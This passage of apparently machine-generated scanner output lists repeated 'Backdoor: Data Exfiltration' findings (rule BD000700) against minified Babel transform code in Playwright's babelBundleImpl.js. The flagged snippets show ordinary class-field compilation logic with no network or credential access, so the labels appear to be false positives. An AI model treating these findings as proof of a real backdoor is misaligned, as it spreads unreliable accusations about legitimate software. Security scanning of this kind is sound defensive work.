                      "text": ".hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"let\"}),Bt.types.assignmentExpression(\"=\",Bt.types.cloneNode(i),e)}}function Hbe(e,t,r){let{scope:n}=e,s=[],i={classBinding:e.node.id&&n.getBinding(e.node.id.name),file:r};for(let a of t){let o=a.get(\"key\");o.isReferencedIdentifier()?VO(o,i):o.traverse(Kbe,i);let l=a.node;if(!o.isConstantExpression()){let u=$O(o.node,n,n.generateUidBasedOnNode(o.node));u&&(s.push(Bt.types.expressionStatement(u)),l.key=Bt.types.cloneNode(u.left))}}return s}});var n_=E(_E=>{\"use strict\";Object.defineProperty(_E,\"_",
                      "markdown": "`.hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"let\"}),Bt.types.assignmentExpression(\"=\",Bt.types.cloneNode(i),e)}}function Hbe(e,t,r){let{scope:n}=e,s=[],i={classBinding:e.node.id&&n.getBinding(e.node.id.name),file:r};for(let a of t){let o=a.get(\"key\");o.isReferencedIdentifier()?VO(o,i):o.traverse(Kbe,i);let l=a.node;if(!o.isConstantExpression()){let u=$O(o.node,n,n.generateUidBasedOnNode(o.node));u&&(s.push(Bt.types.expressionStatement(u)),l.key=Bt.types.cloneNode(u.left))}}return s}});var n_=E(_E=>{\"use strict\";Object.defineProperty(_E,\"_`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 6143,
                  "endLine": 1853,
                  "endColumn": 6148,
                  "snippet": {
                    "text": "i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExpression()),l.replaceWith(Bt.types.sequenceExpression(u))}}else t.get(\"body\").unshiftContainer(\"body\",r)}function $O(e,t,r){if(Bt.types.isIdentifier(e)&&t.hasUid(e.name))return;if(Bt.types.isAssignmentExpression(e,{operator:\"=\"})&&Bt.types.isIdentifier(e.left)&&t.hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"l",
                    "rendered": {
                      "text": "i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExpression()),l.replaceWith(Bt.types.sequenceExpression(u))}}else t.get(\"body\").unshiftContainer(\"body\",r)}function $O(e,t,r){if(Bt.types.isIdentifier(e)&&t.hasUid(e.name))return;if(Bt.types.isAssignmentExpression(e,{operator:\"=\"})&&Bt.types.isIdentifier(e.left)&&t.hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"l",
                      "markdown": "`i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExpression()),l.replaceWith(Bt.types.sequenceExpression(u))}}else t.get(\"body\").unshiftContainer(\"body\",r)}function $O(e,t,r){if(Bt.types.isIdentifier(e)&&t.hasUid(e.name))return;if(Bt.types.isAssignmentExpression(e,{operator:\"=\"})&&Bt.types.isIdentifier(e.left)&&t.hasUid(e.left.name))return Bt.types.cloneNode(e);{let i=Bt.types.identifier(r);return t.push({id:i,kind:\"l`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 5774,
                  "endLine": 1853,
                  "endColumn": 5779,
                  "snippet": {
                    "text": ",r,n,s){if(!r.length)return;let i=!!e.node.superClass;if(!t){let a=Bt.types.classMethod(\"constructor\",Bt.types.identifier(\"constructor\"),[],Bt.types.blockStatement([]));i&&(a.params=[Bt.types.restElement(Bt.types.identifier(\"args\"))],a.body.body.push(Bt.template.statement.ast`super(...args)`)),[t]=e.get(\"body\").unshiftContainer(\"body\",a)}if(n&&n(Wbe,{scope:t.scope}),i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExp",
                    "rendered": {
                      "text": ",r,n,s){if(!r.length)return;let i=!!e.node.superClass;if(!t){let a=Bt.types.classMethod(\"constructor\",Bt.types.identifier(\"constructor\"),[],Bt.types.blockStatement([]));i&&(a.params=[Bt.types.restElement(Bt.types.identifier(\"args\"))],a.body.body.push(Bt.template.statement.ast`super(...args)`)),[t]=e.get(\"body\").unshiftContainer(\"body\",a)}if(n&&n(Wbe,{scope:t.scope}),i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExp",
                      "markdown": "`,r,n,s){if(!r.length)return;let i=!!e.node.superClass;if(!t){let a=Bt.types.classMethod(\"constructor\",Bt.types.identifier(\"constructor\"),[],Bt.types.blockStatement([]));i&&(a.params=[Bt.types.restElement(Bt.types.identifier(\"args\"))],a.body.body.push(Bt.template.statement.ast`super(...args)`)),[t]=e.get(\"body\").unshiftContainer(\"body\",a)}if(n&&n(Wbe,{scope:t.scope}),i){let a=[];t.traverse($be,a);let o=!0;for(let l of a)if(o?o=!1:r=r.map(u=>Bt.types.cloneNode(u)),l.parentPath.isExpressionStatement())l.insertAfter(r);else{let u=[l.node,...r.map(c=>Bt.types.toExpression(c))];s||u.push(Bt.types.thisExp`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 339,
                  "endLine": 1853,
                  "endColumn": 344,
                  "snippet": {
                    "text": "r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"body\").scope,O=D.generateUidIdentifier(\"this\"),_={thisRef:O,argumentsPath:[]};if(t.traverse(UO,_),_.argumentsPath.length){let F=D.generateUidIdentifier(\"arguments\");D.push({id:F,init:N.template.expression.ast`[].slice.call(arguments, 1)`});for(let R of _.argumentsPath)R.replaceWith(N.types.cloneNod",
                    "rendered": {
                      "text": "r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"body\").scope,O=D.generateUidIdentifier(\"this\"),_={thisRef:O,argumentsPath:[]};if(t.traverse(UO,_),_.argumentsPath.length){let F=D.generateUidIdentifier(\"arguments\");D.push({id:F,init:N.template.expression.ast`[].slice.call(arguments, 1)`});for(let R of _.argumentsPath)R.replaceWith(N.types.cloneNod",
                      "markdown": "`r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"body\").scope,O=D.generateUidIdentifier(\"this\"),_={thisRef:O,argumentsPath:[]};if(t.traverse(UO,_),_.argumentsPath.length){let F=D.generateUidIdentifier(\"arguments\");D.push({id:F,init:N.template.expression.ast`[].slice.call(arguments, 1)`});for(let R of _.argumentsPath)R.replaceWith(N.types.cloneNod`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1853,
                  "startColumn": 40,
                  "endLine": 1853,
                  "endColumn": 45,
                  "snippet": {
                    "text": "e()}\n        })\n      `,t)):Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${i}, {\n        // configurable is false by default\n        // enumerable is false by default\n        // writable is false by default\n        value: ${a.name}\n      });\n    `,t)}function Zf(e,t,r,n=!1){let s=r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"",
                    "rendered": {
                      "text": "e()}\n        })\n      `,t)):Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${i}, {\n        // configurable is false by default\n        // enumerable is false by default\n        // writable is false by default\n        value: ${a.name}\n      });\n    `,t)}function Zf(e,t,r,n=!1){let s=r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"",
                      "markdown": "`e()}\n        })\n      `,t)):Yt(N.template.statement.ast`\n      Object.defineProperty(${e}, ${i}, {\n        // configurable is false by default\n        // enumerable is false by default\n        // writable is false by default\n        value: ${a.name}\n      });\n    `,t)}function Zf(e,t,r,n=!1){let s=r.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,getterDeclared:u,setterDeclared:c,static:f}=s,{params:p,body:m,generator:b,async:d}=t.node,y=o&&p.length===0,v=l&&p.length>0;if(y&&u||v&&c)return r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),null;if(ar(e)&&(y||v)&&!n){let D=t.get(\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1838,
                  "startColumn": 513,
                  "endLine": 1838,
                  "endColumn": 518,
                  "snippet": {
                    "text": "sLiteral(r)),s)),t)}function MO(e,t,r){let{key:n,computed:s}=t.node,i=t.node.value||t.scope.buildUndefinedNode();return Yt(N.types.expressionStatement(N.types.callExpression(r.addHelper(\"defineProperty\"),[e,s||N.types.isLiteral(n)?n:N.types.stringLiteral(n.name),i])),t)}function Lbe(e,t,r,n){let s=n.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,initAdded:u}=s;return u?void 0:o||l?(n.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is fal",
                    "rendered": {
                      "text": "sLiteral(r)),s)),t)}function MO(e,t,r){let{key:n,computed:s}=t.node,i=t.node.value||t.scope.buildUndefinedNode();return Yt(N.types.expressionStatement(N.types.callExpression(r.addHelper(\"defineProperty\"),[e,s||N.types.isLiteral(n)?n:N.types.stringLiteral(n.name),i])),t)}function Lbe(e,t,r,n){let s=n.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,initAdded:u}=s;return u?void 0:o||l?(n.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is fal",
                      "markdown": "`sLiteral(r)),s)),t)}function MO(e,t,r){let{key:n,computed:s}=t.node,i=t.node.value||t.scope.buildUndefinedNode();return Yt(N.types.expressionStatement(N.types.callExpression(r.addHelper(\"defineProperty\"),[e,s||N.types.isLiteral(n)?n:N.types.stringLiteral(n.name),i])),t)}function Lbe(e,t,r,n){let s=n.get(t.node.key.id.name),{id:i,methodId:a,getId:o,setId:l,initAdded:u}=s;return u?void 0:o||l?(n.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is fal`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1835,
                  "startColumn": 39,
                  "endLine": 1835,
                  "endColumn": 44,
                  "snippet": {
                    "text": "classPrivateFieldInitSpec\");return Yt(N.template.statement.ast`${l}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)},\n      {\n        get: ${a?a.name:t.scope.buildUndefinedNode()},\n        set: ${o?o.name:t.scope.buildUndefinedNode()}\n      },\n    )`,t)}function jbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i}=s;if(!n.availableHelper(\"classPrivateMethodInitSpec\"))return Yt(N.template.statement.ast`${i}.add(${e})`,t);let a=n.addHelper(\"classPrivateMethodInitSpec\");return Yt(N.template.statement.ast`${a}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)}\n    )`,t)}f",
                    "rendered": {
                      "text": "classPrivateFieldInitSpec\");return Yt(N.template.statement.ast`${l}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)},\n      {\n        get: ${a?a.name:t.scope.buildUndefinedNode()},\n        set: ${o?o.name:t.scope.buildUndefinedNode()}\n      },\n    )`,t)}function jbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i}=s;if(!n.availableHelper(\"classPrivateMethodInitSpec\"))return Yt(N.template.statement.ast`${i}.add(${e})`,t);let a=n.addHelper(\"classPrivateMethodInitSpec\");return Yt(N.template.statement.ast`${a}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)}\n    )`,t)}f",
                      "markdown": "`classPrivateFieldInitSpec\");return Yt(N.template.statement.ast`${l}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)},\n      {\n        get: ${a?a.name:t.scope.buildUndefinedNode()},\n        set: ${o?o.name:t.scope.buildUndefinedNode()}\n      },\n    )`,t)}function jbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i}=s;if(!n.availableHelper(\"classPrivateMethodInitSpec\"))return Yt(N.template.statement.ast`${i}.add(${e})`,t);let a=n.addHelper(\"classPrivateMethodInitSpec\");return Yt(N.template.statement.ast`${a}(\n      ${N.types.thisExpression()},\n      ${N.types.cloneNode(i)}\n    )`,t)}f`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1823,
                  "startColumn": 169,
                  "endLine": 1823,
                  "endColumn": 174,
                  "snippet": {
                    "text": "fault\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`\n          ${i}.set(${e}, {\n            get: ${a?a.name:t.scope.buildUndefinedNode()},\n            set: ${o?",
                    "rendered": {
                      "text": "fault\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`\n          ${i}.set(${e}, {\n            get: ${a?a.name:t.scope.buildUndefinedNode()},\n            set: ${o?",
                      "markdown": "`fault\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.template.statement.ast`\n          ${i}.set(${e}, {\n            get: ${a?a.name:t.scope.buildUndefinedNode()},\n            set: ${o?`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1823,
                  "startColumn": 40,
                  "endLine": 1823,
                  "endColumn": 45,
                  "snippet": {
                    "text": " {\n          // configurable is false by default\n          // enumerable is false by default\n          // writable is false by default\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.te",
                    "rendered": {
                      "text": " {\n          // configurable is false by default\n          // enumerable is false by default\n          // writable is false by default\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.te",
                      "markdown": "` {\n          // configurable is false by default\n          // enumerable is false by default\n          // writable is false by default\n          get: ${a?a.name:t.scope.buildUndefinedNode()},\n          set: ${o?o.name:t.scope.buildUndefinedNode()}\n        });\n      `,t)}function Bbe(e,t,r,n){let s=r.get(t.node.key.id.name);if(!s.initAdded)return!ar(n)&&(s.getId||s.setId)?Fbe(e,t,r,n):jbe(e,t,r,n)}function Fbe(e,t,r,n){let s=r.get(t.node.key.id.name),{id:i,getId:a,setId:o}=s;if(r.set(t.node.key.id.name,Object.assign({},s,{initAdded:!0})),!n.availableHelper(\"classPrivateFieldInitSpec\"))return Yt(N.te`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1808,
                  "startColumn": 46,
                  "endLine": 1808,
                  "endColumn": 51,
                  "snippet": {
                    "text": "          writable: true,\n          value: ${l}\n        };\n      `,e)};var SE;function kbe(e,t,r){let n=r.get(t.node.key.id.name),{methodId:s,id:i,getId:a,setId:o,initAdded:l}=n;if(l)return;if(s)return Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is false by default\n",
                    "rendered": {
                      "text": "          writable: true,\n          value: ${l}\n        };\n      `,e)};var SE;function kbe(e,t,r){let n=r.get(t.node.key.id.name),{methodId:s,id:i,getId:a,setId:o,initAdded:l}=n;if(l)return;if(s)return Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is false by default\n",
                      "markdown": "`          writable: true,\n          value: ${l}\n        };\n      `,e)};var SE;function kbe(e,t,r){let n=r.get(t.node.key.id.name),{methodId:s,id:i,getId:a,setId:o,initAdded:l}=n;if(l)return;if(s)return Yt(N.template.statement.ast`\n        Object.defineProperty(${e}, ${i}, {\n          // configurable is false by default\n          // enumerable is false by default\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1793,
                  "startColumn": 137,
                  "endLine": 1793,
                  "endColumn": 142,
                  "snippet": {
                    "text": "}`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,setId:i,initAdded:a}=r,o=s||i;if(!e.isProperty()&&(a||!o))return;if(o)return t.set(e.node.key.id.name,Object.assign({},r,{initAdded:!0})),Yt(N.template.statement.ast`\n          var ${N.types.cloneNode(n)} = {\n            // configurable is false by default\n         ",
                    "rendered": {
                      "text": "}`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,setId:i,initAdded:a}=r,o=s||i;if(!e.isProperty()&&(a||!o))return;if(o)return t.set(e.node.key.id.name,Object.assign({},r,{initAdded:!0})),Yt(N.template.statement.ast`\n          var ${N.types.cloneNode(n)} = {\n            // configurable is false by default\n         ",
                      "markdown": "`}`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,setId:i,initAdded:a}=r,o=s||i;if(!e.isProperty()&&(a||!o))return;if(o)return t.set(e.node.key.id.name,Object.assign({},r,{initAdded:!0})),Yt(N.template.statement.ast`\n          var ${N.types.cloneNode(n)} = {\n            // configurable is false by default\n         `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1791,
                  "startColumn": 272,
                  "endLine": 1791,
                  "endColumn": 277,
                  "snippet": {
                    "text": "rue,\n          value: ${i},\n        })`,t);let a=n.addHelper(\"classPrivateFieldInitSpec\");return Yt(N.types.expressionStatement(N.types.callExpression(a,[N.types.thisExpression(),N.types.cloneNode(s),ar(n)?i:N.template.expression.ast`{ writable: true, value: ${i} }`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,se",
                    "rendered": {
                      "text": "rue,\n          value: ${i},\n        })`,t);let a=n.addHelper(\"classPrivateFieldInitSpec\");return Yt(N.types.expressionStatement(N.types.callExpression(a,[N.types.thisExpression(),N.types.cloneNode(s),ar(n)?i:N.template.expression.ast`{ writable: true, value: ${i} }`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,se",
                      "markdown": "`rue,\n          value: ${i},\n        })`,t);let a=n.addHelper(\"classPrivateFieldInitSpec\");return Yt(N.types.expressionStatement(N.types.callExpression(a,[N.types.thisExpression(),N.types.cloneNode(s),ar(n)?i:N.template.expression.ast`{ writable: true, value: ${i} }`])),t)}function Nbe(e,t,r){let n=t.get(e.node.key.id.name),s=r?e.node.value:N.template.expression.ast`{\n        _: ${e.node.value||N.types.buildUndefinedNode()}\n      }`;return Yt(N.types.variableDeclaration(\"var\",[N.types.variableDeclarator(N.types.cloneNode(n.id),s)]),e)}SE=function(e,t){let r=t.get(e.node.key.id.name),{id:n,getId:s,se`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1786,
                  "startColumn": 42,
                  "endLine": 1786,
                  "endColumn": 47,
                  "snippet": {
